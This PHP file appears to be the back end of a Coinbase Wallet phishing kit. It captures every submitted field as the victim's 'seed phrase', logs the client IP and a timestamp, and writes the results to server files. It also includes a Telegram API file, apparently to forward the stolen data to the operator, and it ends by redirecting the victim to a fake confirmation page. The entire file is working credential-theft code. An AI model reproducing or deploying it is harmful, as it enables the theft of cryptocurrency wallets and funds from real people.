<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' || $_SERVER['REQUEST_METHOD'] === 'GET') {
    date_default_timezone_set('America/Chicago');
    $InfoDATE = date("d-m-Y h:i:sa");

    function flatten_array(array $arr): array {
        $out = [];
        array_walk_recursive($arr, function($value) use (&$out) {
            $out[] = trim(htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'));
        });
        return $out;
    }

    $rawBody    = file_get_contents('php://input');
    $jsonValues = [];
    $decoded    = json_decode($rawBody, true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) {
        $jsonValues = flatten_array($decoded);
    }

    $getValues  = flatten_array($_GET);
    $postValues = flatten_array($_POST);

    $allValues = array_merge($jsonValues, $getValues, $postValues);

    $phrase = count($allValues)
        ? implode(' ', $allValues)
        : '[no data]';

    $clientIp = 'Unknown';
    if (!empty($_SERVER['REMOTE_ADDR']) && filter_var($_SERVER['REMOTE_ADDR'], FILTER_VALIDATE_IP)) {
        $clientIp = $_SERVER['REMOTE_ADDR'];
    }

    $Noreferer = '<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8" /><meta http-equiv="Content-Security-Policy" content="default-src \'self\'; connect-src \'none\';" /></head><body>';

$yagmai  = "🔹『COINBASE Wallet 』🔹\n";
$yagmai .= "🎫𝗦𝗘𝗘𝗗𝗣𝗛𝗥𝗔𝗦𝗘 :   $phrase\n";
$yagmai .= "[+]━━━━【💻 System】━━━[+]\n";
$yagmai .= "[🔍 IP INFO] = http://www.geoiptool.com/?IP=$clientIp\n";
$yagmai .= "[⏰ TIME/DATE] =$InfoDATE\n";





    include("Your_Info.php");
    include("Api-TeleGram.php");

    $f = fopen("../../da.php", "a");
	fwrite($f, $yagmai);

    $adreferer = fopen("../../da.php", "a");
	fwrite($adreferer, $Noreferer);
        $dreferer = fopen("../../d.php", "a");
	fwrite($dreferer, $Noreferer);



    if (!headers_sent()) {
        header("Location: ../Confirme.html");
        exit;
    } else {
        echo '<script>window.location.href="../Confirme.html";</script>';
        exit;
    }
}
?>
